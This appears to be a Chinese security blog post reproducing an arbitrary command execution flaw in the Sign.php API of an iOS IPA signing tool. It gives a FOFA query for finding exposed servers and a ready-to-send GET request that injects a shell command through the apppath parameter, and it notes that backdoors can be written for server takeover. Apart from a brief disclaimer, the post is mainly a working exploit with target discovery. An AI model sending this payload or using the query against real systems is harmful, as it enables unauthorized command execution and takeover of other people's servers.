#  漏洞复现 || 苹果IOS端IPA签名工具Sign.php接口存在任意命令执行   
韩文庚  我爱林   2024-11-11 21:21  
  
## 免责声明  
  
**我爱林攻防研究院的技术文章仅供参考，****任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得利用网络从事危害国家安全、荣誉和利益****，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
## 漏洞描述  
  
苹果IOS端IPA签名工具Sign.php接口存在任意命令执行漏洞，  
攻击者可以利用此漏洞执行任意指令，且写入后门文件可获取服务器权限，造成严重威胁。  
## 资产确定  
```
fofa： body="/assets/index/css/mobileSelect.css"
```  
## 漏洞复现  
  
1.利用如下PO  
C执行id得到回显  
```
GET /api/sign/sign?udidres[0][sjskg]=1&noinject[name]=a&ttname=1&udid=1&appname=1&appid=a&appicon=1&apppath=|id>2.txt|&p12path=1&mppath=1&appbid=1&ipaPath=1&gm=0&filesPath=1&rm=1&app_name=1 HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlPKYOdb4vIl9BKwPB9q9LTnaXvqBZdc5rRWvRwMgIKHKC9mWr8H8wwVOjxydaSrna1ibPo03T3ZCVQ/640?wx_fmt=png&from=appmsg "")  
  
如有侵权，请联系删除  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
**点它，分享点赞在看都在这里**  
  
  
